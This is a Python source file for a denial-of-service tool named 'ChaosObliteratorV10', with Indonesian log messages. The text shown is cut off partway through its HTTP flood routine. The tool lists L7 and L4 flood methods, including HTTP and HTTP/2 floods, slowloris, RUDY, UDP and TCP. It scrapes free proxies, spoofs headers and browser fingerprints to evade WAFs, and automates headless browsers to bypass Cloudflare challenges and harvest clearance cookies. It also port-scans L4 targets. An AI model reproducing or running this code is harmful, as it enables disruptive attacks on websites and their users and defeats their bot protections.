import threading
import socket
import random
import string
import time
import argparse
import logging
import os
import hashlib
import xxhash
import h2.connection
import h2.events
import json
from typing import List
from playwright.sync_api import sync_playwright
import tls_client
import undetected_chromedriver as uc
import requests
from requests.cookies import RequestsCookieJar
import cloudscraper
import subprocess
import math
import urllib.parse
import sys
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
import ssl
import psutil
import brotli
import gzip
import zlib

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("chaos_obliterator_v10.log"), logging.StreamHandler()]
)

class ChaosObliteratorV10:
    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, 
                 methods: List[str] = None, proxy_mode: str = "auto", proxy_list: str = None, intensity: str = "medium"):
        self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
        self.target_l4 = target_l4 if target_l4 else None
        self.duration = duration
        self.threads = min(threads, 100)  # Increased max threads
        self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator", "http2flood", "rudy"]
        self.intensity = intensity.lower()  # low, medium, high
        self.end_time = time.time() + duration
        self.user_agents = [
            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(124, 126)}.0.0.0 Safari/537.{random.randint(80, 90)}",
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) AppleWebKit/605.1.{random.randint(40, 50)} (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(14, 15)}_{random.randint(0, 5)}) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(124, 126)}.0.0.0 Safari/537.{random.randint(80, 90)}"
        ]
        self.success_count = {m: 0 for m in self.methods}
        self.response_times = {m: [] for m in ["chaoshttp", "ghostloris", "http2flood", "rudy"]}
        self.lock = threading.Lock()
        self.active_ports = [80, 443, 53, 123, 161, 389, 445, 1433, 1900, 5060, 11211, 1812, 5353, 3478, 6881, 17185, 27015, 4433]
        self.jitter_factors = {i: 1.0 for i in range(self.threads)}
        self.cookies = RequestsCookieJar()
        self.session_headers = {}
        self.cookie_file = "cookies.json"
        self.screenshot_dir = "screenshots"
        self.proxy_mode = proxy_mode.lower()  # auto, manual, none
        self.proxy_list = proxy_list.split(",") if proxy_list and proxy_mode == "manual" else []
        self.proxy_pool = self._get_proxy_pool() if proxy_mode != "none" else []
        self.intensity_settings = {
            "low": {"packets_per_thread": 10, "payload_size": 512, "delay": 0.1},
            "medium": {"packets_per_thread": 50, "payload_size": 1024, "delay": 0.05},
            "high": {"packets_per_thread": 100, "payload_size": 2048, "delay": 0.01}
        }
        os.makedirs(self.screenshot_dir, exist_ok=True)

    def _get_proxy_pool(self) -> List[str]:
        """Fetch proxy pool based on mode with enhanced validation."""
        proxies = []
        if self.proxy_mode == "manual":
            proxies = [p.strip() for p in self.proxy_list if p.strip()]
        elif self.proxy_mode == "auto":
            sources = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks5&timeout=1000&country=all&ssl=all&anonymity=elite",
                "https://www.free-proxy-list.net/",
                "https://www.proxy-list.download/api/v1/get?type=https"
            ]
            for source in sources:
                try:
                    response = requests.get(source, timeout=5)
                    if "proxyscrape" in source:
                        proxies.extend(response.text.splitlines())
                    elif "free-proxy-list" in source:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        for row in soup.select("table.table tbody tr"):
                            cols = row.find_all("td")
                            if len(cols) > 1:
                                ip, port = cols[0].text, cols[1].text
                                proxies.append(f"http://{ip}:{port}")
                    else:
                        proxies.extend(response.text.splitlines())
                except:
                    logging.warning(f"Gagal mengambil proxy dari {source}")
        valid_proxies = []
        for proxy in proxies:
            if proxy and len(valid_proxies) < 20:  # Increased proxy pool size
                try:
                    start_time = time.time()
                    test_response = requests.get("https://www.google.com", proxies={"https": proxy}, timeout=1.5)
                    if test_response.status_code == 200 and (time.time() - start_time) * 1000 < 800:
                        valid_proxies.append(proxy)
                        logging.info(f"Proxy {proxy} ditambahkan ke pool (latensi: {(time.time() - start_time) * 1000:.2f}ms)")
                except:
                    pass
        return valid_proxies if valid_proxies else [None]

    def _random_payload(self, size: int = 512) -> bytes:
        """Generate polymorphic payload with compression."""
        seed = f"{random.randint(10000000000000000, 99999999999999999)}{time.time_ns()}{os.urandom(15).hex()}".encode()
        hash1 = xxhash.xxh3_128(seed).digest()
        hash2 = hashlib.sha3_512(hash1 + os.urandom(13)).digest()
        hash3 = xxhash.xxh64(hash2 + os.urandom(11)).digest()
        hash4 = hashlib.blake2b(hash3 + os.urandom(9), digest_size=32).digest()
        payload = (hash4 + hash3 + hash2 + os.urandom(1))[:size]
        if random.random() < 0.3:
            payload = brotli.compress(payload)
        elif random.random() < 0.6:
            payload = gzip.compress(payload)
        else:
            payload = zlib.compress(payload)
        return payload

    def _random_path(self) -> str:
        """Generate obfuscated URL paths with balanced complexity."""
        prefixes = ["v16", "chaos", "obliterator", "nexus", "vortex"]
        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) for _ in range(random.randint(1, 3))]
        query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=16))}&epoch={random.randint(100000000000000, 999999999999999)}"
        return random.choice([
            f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}",
            "/home", "/about", "/contact", "/"
        ])

    def _random_ip(self) -> str:
        """Generate spoofed IP for headers."""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def _random_headers(self) -> dict:
        """Generate WAF-evading headers with compression support."""
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": self._random_ip(),
            "Accept": random.choice(["application/json", "text/html", "*/*"]),
            "Accept-Encoding": random.choice(["gzip", "br", "deflate"]),
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Connection": "keep-alive",
            "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(124, 126)}", "Not;A=Brand";v="8", "Chromium";v="{random.randint(124, 126)}"',
            "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"'])
        }
        headers.update(self.session_headers)
        if random.random() < 0.95:
            headers["X-Entropy-Chaos"] = ''.join(random.choices(string.hexdigits.lower(), k=24))
        return headers

    def _save_cookies(self, cookies, response_headers: dict = None):
        """Save cookies and headers for debugging."""
        data = {"timestamp": time.time(), "cookies": cookies}
        if response_headers:
            data["response_headers"] = dict(response_headers)
        with open(self.cookie_file, "w") as f:
            json.dump(data, f, indent=2)
        logging.info(f"Cookies disimpan ke {self.cookie_file}")

    def _save_screenshot(self, obj, attempt: int, error_type: str):
        """Save screenshot for debugging with enhanced error handling."""
        screenshot_path = os.path.join(self.screenshot_dir, f"{error_type}_attempt_{attempt}_{int(time.time())}.png")
        try:
            if hasattr(obj, 'screenshot'):
                obj.screenshot(path=screenshot_path)
            elif hasattr(obj, 'get_screenshot_as_file'):
                obj.get_screenshot_as_file(screenshot_path)
            else:
                logging.warning(f"Tidak bisa menyimpan screenshot untuk objek {type(obj)}")
                return
            logging.info(f"Screenshot disimpan ke {screenshot_path}")
        except Exception as e:
            logging.warning(f"Gagal menyimpan screenshot ke {screenshot_path}: {e}")

    def _get_browser_session(self):
        """Use headless browser to bypass JS challenges with optimized flow."""
        max_attempts = 3
        attempt = 0
        viewports = [
            {"width": random.randint(1280, 2560), "height": random.randint(720, 1440)},
            {"width": random.randint(1280, 1920), "height": random.randint(720, 1080)},
            {"width": random.randint(1366, 1920), "height": random.randint(768, 1200)}
        ]
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True, proxy={"server": proxy} if proxy else None)
                    context = browser.new_context(
                        user_agent=random.choice(self.user_agents),
                        viewport=random.choice(viewports),
                        java_script_enabled=True,
                        ignore_https_errors=True
                    )
                    page = context.new_page()
                    
                    # Log network events
                    page.on("response", lambda response: logging.debug(f"Respons jaringan: {response.url} - Status {response.status}"))
                    
                    # Inject spoofing
                    page.evaluate("""
                        () => {
                            const getContext = HTMLCanvasElement.prototype.getContext;
                            HTMLCanvasElement.prototype.getContext = function(contextType, attributes) {
                                if (contextType === 'webgl' || contextType === 'webgl2') {
                                    const gl = getContext.call(this, contextType, attributes);
                                    const origGetParameter = gl.getParameter;
                                    gl.getParameter = function(parameter) {
                                        if (parameter === gl.RENDERER || parameter === gl.VENDOR) {
                                            return 'WebGL Spoofed ' + Math.random().toString(36).substring(7);
                                        }
                                        return origGetParameter.call(this, parameter);
                                    };
                                    return gl;
                                }
                                return getContext.call(this, contextType, attributes);
                            };
                            const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New'];
                            Object.defineProperty(window, 'FontFace', {
                                value: function() { return { family: fonts[Math.floor(Math.random() * fonts.length)] }; }
                            });
                            window.ontouchstart = () => {};
                            window.ontouchmove = () => {};
                            const origAudioContext = window.AudioContext;
                            window.AudioContext = function() {
                                const ctx = new origAudioContext();
                                ctx.sampleRate = 44100 + Math.random() * 100;
                                return ctx;
                            };
                        }
                    """)
                    
                    # Navigate with reduced timeout
                    path = self._random_path()
                    url = f"https://{self.target_l7}{path}"
                    logging.info(f"Percobaan {attempt + 1}: Navigasi ke {url}")
                    try:
                        page.goto(url, wait_until="domcontentloaded", timeout=8000)
                    except Exception as e:
                        logging.error(f"Percobaan {attempt + 1}: Page.goto gagal: {e}")
                        self._save_screenshot(page, attempt + 1, "page_goto_error")
                        attempt += 1
                        browser.close()
                        continue
                    time.sleep(random.uniform(0.3, 1.0))
                    
                    # Gradual scroll
                    for _ in range(2):
                        page.evaluate("window.scrollBy(0, document.body.scrollHeight * 0.4)")
                        time.sleep(random.uniform(0.15, 0.3))
                    
                    # Simulate Bezier curve mouse movement
                    for _ in range(2):
                        x_start = random.randint(100, 800)
                        y_start = random.randint(100, 600)
                        x_end = random.randint(100, 800)
                        y_end = random.randint(100, 600)
                        x_control1 = x_start + random.randint(-50, 50)
                        y_control1 = y_start + random.randint(-50, 50)
                        x_control2 = x_end + random.randint(-50, 50)
                        y_control2 = y_end + random.randint(-50, 50)
                        steps = 15
                        for t in range(steps + 1):
                            t = t / steps
                            x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                            y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                            page.mouse.move(x, y)
                            time.sleep(random.uniform(0.008, 0.015))
                    
                    # Simulate hover with fallback
                    try:
                        elements = page.query_selector_all("a, button, [role='button'], [onclick]")
                        if elements:
                            element = random.choice(elements)
                            blocking = page.evaluate("""
                                (element) => {
                                    const rect = element.getBoundingClientRect();
                                    const topElement = document.elementFromPoint(rect.left + rect.width / 2, rect.top + rect.height / 2);
                                    return topElement !== element ? topElement.outerHTML : null;
                                }
                            """, element)
                            if blocking:
                                logging.warning(f"Percobaan {attempt + 1}: Elemen blokir terdeteksi: {blocking[:100]}")
                                page.evaluate("element => element.dispatchEvent(new MouseEvent('mouseover'))", element)
                            else:
                                element.scroll_into_view_if_needed()
                                element.hover(timeout=3000)
                            time.sleep(random.uniform(0.15, 0.3))
                        else:
                            logging.warning(f"Percobaan {attempt + 1}: Tidak ada elemen yang bisa dihover.")
                    except Exception as e:
                        logging.error(f"Percobaan {attempt + 1}: Hover gagal: {e}")
                        self._save_screenshot(page, attempt + 1, "hover_timeout")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Simulate drag event
                    page.mouse.down()
                    page.mouse.move(random.randint(100, 800), random.randint(100, 600), steps=8)
                    page.mouse.up()
                    time.sleep(random.uniform(0.2, 0.4))
                    
                    # Random interactions
                    if random.random() < 0.3:
                        page.reload(wait_until="domcontentloaded", timeout=8000)
                        time.sleep(random.uniform(0.4, 0.8))
                    if page.query_selector("input[type='text']"):
                        page.fill("input[type='text']", ''.join(random.choices(string.ascii_letters, k=6)))
                        time.sleep(random.uniform(0.15, 0.3))
                    
                    # Check page status
                    response = page.evaluate("() => document.readyState")
                    if response != "complete":
                        logging.warning(f"Percobaan {attempt + 1}: Halaman tidak sepenuhnya dimuat.")
                        self._save_screenshot(page, attempt + 1, "page_not_loaded")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Check HTTP status and response body
                    status = page.evaluate("() => window.performance.getEntriesByType('navigation')[0]?.responseStatus || 0")
                    response_body = page.content()[:200]
                    if status in [403, 429]:
                        logging.warning(f"Percobaan {attempt + 1}: HTTP {status} terdeteksi. Respons: {response_body}")
                        self._save_screenshot(page, attempt + 1, "http_error")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Get and validate cookies
                    cookies = context.cookies()
                    cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                    cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                    cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                    if not (cf_clearance and cf_bm):
                        logging.warning(f"Percobaan {attempt + 1}: Tidak ada cf_clearance atau __cf_bm. Respons: {response_body}")
                        self._save_cookies(cookies)
                        self._save_screenshot(page, attempt + 1, "cookie_missing")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Validate cookies with test request
                    test_headers = self._random_headers()
                    test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                    test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=4)
                    if test_response.status_code != 200:
                        logging.warning(f"Percobaan {attempt + 1}: Validasi cookie gagal, status {test_response.status_code}. Respons: {test_response.text[:200]}")
                        self._save_cookies(cookies, test_response.headers)
                        self._save_screenshot(page, attempt + 1, "cookie_validation_failed")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Check cookie expiry
                    for cookie in cookies:
                        if "expires" in cookie and cookie["expires"] < time.time() + 120:
                            logging.warning(f"Percobaan {attempt + 1}: Cookie {cookie['name']} kadaluarsa terlalu cepat.")
                            self._save_cookies(cookies, test_response.headers)
                            self._save_screenshot(page, attempt + 1, "cookie_expiry")
                            attempt += 1
                            browser.close()
                            continue
                    
                    # Store cookies
                    for cookie in cookies:
                        self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                    
                    self.session_headers = {
                        "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Dest": "document"
                    }
                    self._save_cookies(cookies, test_response.headers)
                    browser.close()
                    logging.info("Tantangan JS berhasil dilewati, cookie diperoleh.")
                    return
            except Exception as e:
                logging.error(f"Playwright gagal: {e}")
                self._save_screenshot(page, attempt + 1, "playwright_error")
                attempt += 1
                browser.close()
                continue
        logging.warning("Beralih ke undetected_chromedriver fallback...")
        self._get_browser_session_fallback()

    def _get_browser_session_fallback(self):
        """Fallback to undetected_chromedriver with improved stability."""
        max_attempts = 3
        attempt = 0
        viewports = [
            {"width": random.randint(1280, 2560), "height": random.randint(720, 1440)},
            {"width": random.randint(1280, 1920), "height": random.randint(720, 1080)},
            {"width": random.randint(1366, 1920), "height": random.randint(768, 1200)}
        ]
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
            try:
                options = uc.ChromeOptions()
                options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
                options.add_argument("--headless=new")
                if proxy:
                    options.add_argument(f"--proxy-server={proxy}")
                options.add_argument("--disable-gpu")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-blink-features=AutomationControlled")
                driver = uc.Chrome(options=options, headless=True, use_subprocess=True)
                
                # Apply stealth
                stealth(driver,
                    languages=["en-US", "en"],
                    vendor="Google Inc.",
                    platform="Win32",
                    webgl_vendor="Intel Inc.",
                    renderer="Intel Iris OpenGL Engine",
                    fix_hairline=True
                )
                
                # Navigate
                path = self._random_path()
                url = f"https://{self.target_l7}{path}"
                logging.info(f"Percobaan fallback {attempt + 1}: Navigasi ke {url}")
                try:
                    driver.get(url)
                    time.sleep(random.uniform(0.3, 1.0))
                except Exception as e:
                    logging.error(f"Percobaan fallback {attempt + 1}: Navigasi gagal: {e}")
                    self._save_screenshot(driver, attempt + 1, "navigation_error_fallback")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Gradual scroll
                for _ in range(2):
                    driver.execute_script("window.scrollBy(0, document.body.scrollHeight * 0.4)")
                    time.sleep(random.uniform(0.15, 0.3))
                
                # Simulate Bezier curve mouse movement
                for _ in range(2):
                    x_start = random.randint(100, 800)
                    y_start = random.randint(100, 600)
                    x_end = random.randint(100, 800)
                    y_end = random.randint(100, 600)
                    x_control1 = x_start + random.randint(-50, 50)
                    y_control1 = y_start + random.randint(-50, 50)
                    x_control2 = x_end + random.randint(-50, 50)
                    y_control2 = y_end + random.randint(-50, 50)
                    steps = 15
                    for t in range(steps + 1):
                        t = t / steps
                        x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                        y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                        driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
                        time.sleep(random.uniform(0.008, 0.015))
                
                # Simulate hover with fallback
                try:
                    elements = driver.find_elements(By.CSS_SELECTOR, "a, button, [role='button'], [onclick]")
                    if elements:
                        element = random.choice(elements)
                        blocking = driver.execute_script("""
                            return (element) => {
                                const rect = element.getBoundingClientRect();
                                const topElement = document.elementFromPoint(rect.left + rect.width / 2, rect.top + rect.height / 2);
                                return topElement !== element ? topElement.outerHTML : null;
                            }
                        """, element)
                        if blocking:
                            logging.warning(f"Percobaan fallback {attempt + 1}: Elemen blokir terdeteksi: {blocking[:100]}")
                            driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
                        else:
                            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                            element.click()
                        time.sleep(random.uniform(0.15, 0.3))
                    else:
                        logging.warning(f"Percobaan fallback {attempt + 1}: Tidak ada elemen yang bisa dihover.")
                except Exception as e:
                    logging.error(f"Percobaan fallback {attempt + 1}: Hover gagal: {e}")
                    self._save_screenshot(driver, attempt + 1, "hover_timeout_fallback")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Simulate drag event
                driver.execute_script("document.elementFromPoint(500, 300).dispatchEvent(new MouseEvent('mousedown'))")
                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mousemove'))")
                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mouseup'))")
                time.sleep(random.uniform(0.2, 0.4))
                
                # Random interactions
                if random.random() < 0.3:
                    driver.refresh()
                    time.sleep(random.uniform(0.4, 0.8))
                try:
                    driver.find_element(By.CSS_SELECTOR, "input[type='text']").send_keys(''.join(random.choices(string.ascii_letters, k=6)))
                    time.sleep(random.uniform(0.15, 0.3))
                except:
                    pass
                
                # Get cookies and validate
                cookies = driver.get_cookies()
                cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                if not (cf_clearance and cf_bm):
                    logging.error(f"Percobaan fallback {attempt + 1}: Tidak ada cf_clearance atau __cf_bm.")
                    self._save_cookies(cookies)
                    self._save_screenshot(driver, attempt + 1, "cookie_missing_fallback")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Validate cookies with test request
                test_headers = self._random_headers()
                test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=4)
                if test_response.status_code != 200:
                    logging.error(f"Percobaan fallback {attempt + 1}: Validasi cookie gagal, status {test_response.status_code}. Respons: {test_response.text[:200]}")
                    self._save_cookies(cookies, test_response.headers)
                    self._save_screenshot(driver, attempt + 1, "cookie_validation_failed_fallback")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Check cookie expiry
                for cookie in cookies:
                    if "expires" in cookie and cookie["expires"] < time.time() + 120:
                        logging.error(f"Percobaan fallback {attempt + 1}: Cookie {cookie['name']} kadaluarsa terlalu cepat.")
                        self._save_cookies(cookies, test_response.headers)
                        self._save_screenshot(driver, attempt + 1, "cookie_expiry_fallback")
                        attempt += 1
                        driver.quit()
                        continue
                
                # Store cookies
                for cookie in cookies:
                    self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                
                self.session_headers = {
                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "document"
                }
                self._save_cookies(cookies, test_response.headers)
                driver.quit()
                logging.info("Fallback: Tantangan JS berhasil dilewati, cookie diperoleh.")
                return
            except Exception as e:
                logging.error(f"Fallback gagal: {e}")
                self._save_screenshot(None, attempt + 1, "fallback_error")
                attempt += 1
                if 'driver' in locals():
                    driver.quit()
                continue
        logging.warning("Beralih ke cloudscraper fallback...")
        self._get_browser_session_cloudscraper()

    def _get_browser_session_cloudscraper(self):
        """Fallback using cloudscraper with improved handling."""
        max_attempts = 3
        attempt = 0
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
            try:
                scraper = cloudscraper.create_scraper()
                response = scraper.get(f"https://{self.target_l7}{self._random_path()}", proxies={"https": proxy} if proxy else None, timeout=8)
                cookies = response.cookies.get_dict()
                cf_clearance = "cf_clearance" in cookies
                cf_bm = "__cf_bm" in cookies
                cf_chl = any(name.startswith("cf_chl") for name in cookies)
                if not (cf_clearance and cf_bm):
                    logging.error(f"Percobaan cloudscraper {attempt + 1}: Tidak ada cf_clearance atau __cf_bm. Respons: {response.text[:200]}")
                    self._save_cookies(cookies, response.headers)
                    self._save_screenshot(None, attempt + 1, "cookie_missing_cloudscraper")
                    attempt += 1
                    continue
                
                # Validate cookies
                test_headers = self._random_headers()
                test_headers["Cookie"] = "; ".join([f"{name}={value}" for name, value in cookies.items()])
                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=4)
                if test_response.status_code != 200:
                    logging.error(f"Percobaan cloudscraper {attempt + 1}: Validasi cookie gagal, status {test_response.status_code}. Respons: {test_response.text[:200]}")
                    self._save_cookies(cookies, response.headers)
                    self._save_screenshot(None, attempt + 1, "cookie_validation_failed_cloudscraper")
                    attempt += 1
                    continue
                
                # Check cookie expiry
                for name, value in cookies.items():
                    if name in ["cf_clearance", "__cf_bm"] and response.cookies[name].expires < time.time() + 120:
                        logging.error(f"Percobaan cloudscraper {attempt + 1}: Cookie {name} kadaluarsa terlalu cepat.")
                        self._save_cookies(cookies, response.headers)
                        self._save_screenshot(None, attempt + 1, "cookie_expiry_cloudscraper")
                        attempt += 1
                        continue
                
                # Store cookies
                for name, value in cookies.items():
                    self.cookies.set(name, value, domain=self.target_l7, path="/")
                
                self.session_headers = {
                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "document"
                }
                self._save_cookies(cookies, response.headers)
                logging.info("Cloudscraper: Tantangan JS berhasil dilewati, cookie diperoleh.")
                return
            except Exception as e:
                logging.error(f"Cloudscraper gagal: {e}")
                self._save_screenshot(None, attempt + 1, "cloudscraper_error")
                attempt += 1
                continue
        logging.warning("Beralih ke HTTP/2 fallback...")
        self._get_browser_session_h2()

    def _get_browser_session_h2(self):
        """Fallback to HTTP/2 request with improved stability."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_l7, 443))
            context = ssl._create_unverified_context()
            sock = context.wrap_socket(sock, server_hostname=self.target_l7)
            h2conn = h2.connection.H2Connection()
            h2conn.initiate_connection()
            sock.sendall(h2conn.data_to_send())
            headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": self._random_path()}
            headers.update(self._random_headers())
            h2conn.send_headers(1, headers, end_stream=True)
            sock.sendall(h2conn.data_to_send())
            response = b""
            while True:
                data = sock.recv(65535)
                if not data:
                    break
                response += data
                events = h2conn.receive_data(data)
                for event in events:
                    if isinstance(event, h2.events.ResponseReceived):
                        logging.debug(f"Respons HTTP/2: {event.headers}, body: {response[:200].decode('utf-8', errors='ignore')}")
                        cookies = [h for h in event.headers if h[0] == b"set-cookie"]
                        if cookies:
                            cookie_dict = {}
                            for cookie in cookies:
                                name, value = cookie[1].decode().split(";")[0].split("=")
                                cookie_dict[name] = value
                            cf_clearance = "cf_clearance" in cookie_dict
                            cf_bm = "__cf_bm" in cookie_dict
                            cf_chl = any(name.startswith("cf_chl") for name in cookie_dict)
                            if cf_clearance and cf_bm:
                                for name, value in cookie_dict.items():
                                    self.cookies.set(name, value, domain=self.target_l7, path="/")
                                self.session_headers = {
                                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                                    "Sec-Fetch-Site": "same-origin",
                                    "Sec-Fetch-Mode": "navigate",
                                    "Sec-Fetch-Dest": "document"
                                }
                                self._save_cookies(cookie_dict, event.headers)
                                logging.info("HTTP/2: Tantangan JS berhasil dilewati, cookie diperoleh.")
                                sock.close()
                                return
            sock.close()
            logging.error("HTTP/2 gagal: Tidak ada cf_clearance atau __cf_bm.")
        except Exception as e:
            logging.error(f"HTTP/2 gagal: {e}")

    def _check_environment(self):
        """Check environment for dependencies."""
        try:
            import playwright
            version = subprocess.check_output(["playwright", "--version"]).decode().strip()
            logging.info(f"Playwright terdeteksi, versi: {version}")
        except:
            logging.error("Playwright tidak terpasang. Jalankan: pip3 install playwright")
            return False
        try:
            import tls_client
            logging.info(f"tls_client terdeteksi, versi: {tls_client.__version__}")
        except:
            logging.error("tls_client tidak terpasang. Jalankan: pip3 install tls-client")
            return False
        try:
            import selenium
            logging.info(f"Selenium terdeteksi, versi: {selenium.__version__}")
        except:
            logging.warning("Selenium tidak terpasang. Jalankan: pip3 install selenium")
        try:
            import undetected_chromedriver
            logging.info(f"undetected_chromedriver terdeteksi, versi: {undetected_chromedriver.__version__}")
        except:
            logging.warning("undetected_chromedriver tidak terpasang. Jalankan: pip3 install undetected-chromedriver")
        try:
            import cloudscraper
            logging.info(f"cloudscraper terdeteksi")
        except:
            logging.warning("cloudscraper tidak terpasang. Jalankan: pip3 install cloudscraper")
        try:
            os.system("playwright install chromium > /dev/null 2>&1")
            logging.info("Chromium terpasang untuk Playwright.")
        except:
            logging.warning("Gagal memasang Chromium, fallback mungkin digunakan.")
        if os.system("command -v xvfb-run > /dev/null") != 0:
            logging.warning("Xvfb tidak terdeteksi, memasang...")
            os.system("sudo apt update && sudo apt install -y xvfb > /dev/null 2>&1")
            if os.system("command -v xvfb-run > /dev/null") == 0:
                logging.info("Xvfb berhasil dipasang.")
            else:
                logging.warning("Gagal memasang Xvfb, mungkin gagal di lingkungan non-GUI.")
        return True

    def _refresh_cookies(self):
        """Refresh cookies every 8 seconds."""
        while time.time() < self.end_time:
            try:
                self._get_browser_session()
            except Exception as e:
                logging.error(f"Refresh cookie gagal: {e}")
            time.sleep(8)

    def _scan_ports(self):
        """Dynamic port scanning for L4 targets with enhanced efficiency."""
        if not self.target_l4:
            return
        new_ports = []
        test_ports = [80, 443, 8080, 3389, 1433, 3306, 1723, 445, 1812, 5353, 3478, 6881, 17185, 27015, 4433]
        for port in test_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.03)
                sock.connect((self.target_l4, port))
                new_ports.append(port)
                sock.close()
            except:
                pass
        if new_ports:
            with self.lock:
                self.active_ports = new_ports
        logging.info(f"Port aktif terdeteksi: {self.active_ports}")

    def _adjust_jitter(self, thread_id: int, response_time: float):
        """Per-thread adaptive jitter with intensity adjustment."""
        settings = self.intensity_settings[self.intensity]
        with self.lock:
            if response_time > 100:
                self.jitter_factors[thread_id] = min(self.jitter_factors[thread_id] * 1.3, 2.5)
            elif response_time < 30:
                self.jitter_factors[thread_id] = max(self.jitter_factors[thread_id] * 0.7, 0.3)
        return random.expovariate(1 / self.jitter_factors[thread_id]) * settings["delay"]

    def _chaoshttp(self, thread_id: int):
        """L7: Enhanced HTTP flood with compression and intensity."""
        if not self.target_l7:
            return
        session = tls_client.Session(
            client_identifier=random.choice([f"chrome_{random.randint(124, 126)}", "firefox_126", "edge_125"]),
            random_tls_extension_order=True
        )
        settings = self.intensity_settings[self.intensity]
        for _ in range(settings["packets_per_thread"]):
            if time.time() >= self.end_time:
                break
            start_time = time.time()
            try:
                headers = self._random_headers()
                method = random.choice(["GET", "POST", "PUT", "HEAD"])
                path = self._random_path()
                url = f"https://{self.target_l7}{path}"
